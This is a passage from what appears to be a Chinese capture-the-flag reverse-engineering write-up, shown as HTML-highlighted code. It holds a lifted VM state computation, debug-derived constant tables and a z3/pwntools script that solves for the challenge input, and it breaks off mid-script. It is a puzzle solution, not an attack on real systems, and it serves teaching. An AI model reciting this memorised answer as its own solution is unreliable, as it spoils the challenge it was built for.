class="hljs-number">0</span>;<br>_1389: state[<span class="hljs-number">2</span>] += <span class="hljs-number">842217029</span>;<br>_1404: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1483902564</span>;<br>_1420: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1426: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1432: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_1439: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1449: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1455: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1462: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1868013731</span>;<br>_1478: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1484: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1490: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_1498: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1508: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1514: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1521: state[<span class="hljs-number">2</span>] += <span class="hljs-number">584694732</span>;<br>_1536: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1453312700</span>;<br>_1552: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1558: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1564: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1572: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1582: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1588: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1595: state[<span class="hljs-number">2</span>] += <span class="hljs-number">223548744</span>;<br>_1610: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1616: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1622: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1630: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1640: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1646: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1653: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1958883726</span>;<br>_1669: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1916008099</span>;<br>_1685: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1691: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1697: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1705: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1715: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1721: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1728: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1829937605</span>;<br>_1744: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1815356086</span>;<br>_1760: state[<span class="hljs-number">2</span>] += <span class="hljs-number">253836698</span>;<br>_1775: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1781: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br><br>_244: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) &#123;<br>_653: state[<span class="hljs-number">0</span>] = <span class="hljs-number">123456789</span>;<br>_668: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_675: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_685: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_691: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_697: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_704: state[<span class="hljs-number">2</span>] += <span class="hljs-number">846786818</span>;<br>_719: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_725: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_732: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_742: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_749: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_756: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_766: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_772: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_778: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_785: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1443538759</span>;<br>_801: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_807: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_814: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_824: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_831: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_838: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_848: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_854: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_860: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_867: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1047515510</span>;<br>_883: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_889: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_896: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_906: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_913: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_921: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_931: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_937: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_943: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_950: state[<span class="hljs-number">2</span>] += <span class="hljs-number">359499514</span>;<br>_965: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1724461856</span>;<br>_981: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_987: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_995: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1005: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1012: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1020: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1030: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1036: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1042: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1049: state[<span class="hljs-number">2</span>] += <span class="hljs-number">241024035</span>;<br>_1064: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1070: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1078: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1088: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1095: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1103: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1113: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1119: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1125: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1132: state[<span class="hljs-number">2</span>] += <span class="hljs-number">222267724</span>;<br>_1147: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1153: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1161: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1171: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1178: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1186: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1196: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1202: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1208: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1215: state[<span class="hljs-number">2</span>] += <span class="hljs-number">844096018</span>;<br>_1230: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1236: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1244: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1254: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>目标状态 ==state[0] == 0== </p><p>z3 爆破中间数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python">state = [<span class="hljs-number">0</span>] * <span class="hljs-number">30</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1374542625</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1686915720</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1129686860</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">842217029</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1483902564</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1868013731</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">3</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">584694732</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1453312700</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">4</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">223548744</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">5</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1958883726</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1916008099</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">6</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1829937605</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1815356086</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">253836698</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>print(state[<span class="hljs-number">0</span>])<br>s = Solver()<br>s.add(state[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)<br>print(s.check())<br>res = s.model()<br>data2 = [res[rr].as_long() <span class="hljs-keyword">for</span> rr <span class="hljs-keyword">in</span> data]<br>data2_bytes = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data2:<br>    data2_bytes += p32(x)<br>print(data2_bytes)<br>data2_bytes = <span class="hljs-built_in">bytearray</span>(data2_bytes)<br></code></pre></td></tr></table></figure><p>通过调试获取关键量 + 和 xor 运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tab2 = [<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x12</span>]  <span class="hljs-comment">#  _602: state[4] += state[0];  state[0] 与 下标对应的数据表</span><br><br>tab3 = [<span class="hljs-number">0x33A1</span>, <span class="hljs-number">0x33A3</span>, <span class="hljs-number">0x33AD</span>, <span class="hljs-number">0x33B9</span>, <span class="hljs-number">0x33C1</span>, <span class="hljs-number">0x33CB</span>, <span class="hljs-number">0x33D3</span>, <span class="hljs-number">0x33EB</span>, <span class="hljs-number">0x33F1</span>, <span class="hljs-number">0x33FD</span>, <span class="hljs-number">0x3401</span>, <span class="hljs-number">0x340F</span>, <span class="hljs-number">0x3413</span>, <span class="hljs-number">0x3419</span>, <span class="hljs-number">0x341B</span>, <span class="hljs-number">0x3437</span>, <span class="hljs-number">0x3445</span>, <span class="hljs-number">0x3455</span>, <span class="hljs-number">0x3457</span>, <span class="hljs-number">0x3463</span>, <span class="hljs-number">0x3469</span>, <span class="hljs-number">0x346D</span>, <span class="hljs-number">0x3481</span>, <span class="hljs-number">0x348B</span>, <span class="hljs-number">0x3491</span>, <span class="hljs-number">0x3497</span>, <span class="hljs-number">0x349D</span>, <span class="hljs-number">0x34A5</span>, <span class="hljs-number">0x34AF</span>, <span class="hljs-number">0x34BB</span>, <span class="hljs-number">0x34C9</span>, <span class="hljs-number">0x34D3</span>, <span class="hljs-number">0x34E1</span>, <span class="hljs-number">0x34F1</span>, <span class="hljs-number">0x34FF</span>, <span class="hljs-number">0x3509</span>, <span class="hljs-number">0x3517</span>, <span class="hljs-number">0x351D</span>, <span class="hljs-number">0x0000</span>] <span class="hljs-comment"># _578: state[4] ^= state[2] &amp; 0xFF;</span><br></code></pre></td></tr></table></figure><p>完整解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>tab2 = [<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x12</span>]<br><br>tab3 = [<span class="hljs-number">0x33A1</span>, <span class="hljs-number">0x33A3</span>, <span class="hljs-number">0x33AD</span>, <span class="hljs-number">0x33B9</span>, <span class="hljs-number">0x33C1</span>, <span class="hljs-number">0x33CB</span>, <span class="hljs-number">0x33D3</span>, <span class="hljs-number">0x33EB</span>, <span class="hljs-number">0x33F1</span>, <span class="hljs-number">0x33FD</span>, <span class="hljs-number">0x3401</span>, <span class="hljs-number">0x340F</span>, <span class="hljs-number">0x3413</span>, <span class="hljs-number">0x3419</span>, <span class="hljs-number">0x341B</span>, <span class="hljs-number">0x3437</span>, <span class="hljs-number">0x3445</span>, <span class="hljs-number">0x3455</span>, <span class="hljs-number">0x3457</span>, <span class="hljs-number">0x3463</span>, <span class="hljs-number">0x3469</span>, <span class="hljs-number">0x346D</span>, <span class="hljs-number">0x3481</span>, <span class="hljs-number">0x348B</span>, <span class="hljs-number">0x3491</span>, <span class="hljs-number">0x3497</span>, <span class="hljs-number">0x349D</span>, <span class="hljs-number">0x34A5</span>, <span class="hljs-number">0x34AF</span>, <span class="hljs-number">0x34BB</span>, <span class="hljs-number">0x34C9</span>, <span class="hljs-number">0x34D3</span>, <span class="hljs-number">0x34E1</span>, <span class="hljs-number">0x34F1</span>, <span class="hljs-number">0x34FF</span>, <span class="hljs-number">0x3509</span>, <span class="hljs-number">0x3517</span>, <span class="hljs-number">0x351D</span>, <span class="hljs-number">0x0000</span>]<br><br>data = [BitVec(<span class="hljs-string">&quot;bv%d&quot;</span> % i, <span class="hljs-number">33</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)]<br><br>state = [<span class="hljs-number">0</span>] * <span class="hljs-number">30</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1374542625</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1686915720</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1129686860</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">842217029</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1483902564</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1868013731</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">3</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">584694732</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1453312700</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">4</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">223548744</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">5</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1958883726</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1916008099</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span><br>state[<span class="hljs-number">1</span>] = data[<span class="hljs-number">6</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1829937605</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1815356086</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">253836698</span><br>state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>]<br>print(state[<span class="hljs-number">0</span>])<br>s = Solver()<br>s.add(state[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)<br>print(s.check())<br>res = s.model()<br>data2 = [res[rr].as_long() <span class="hljs-keyword">for</span> rr <span class="hljs-keyword">in</span> data]<br>data2_bytes = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data2:<br>    data2_bytes 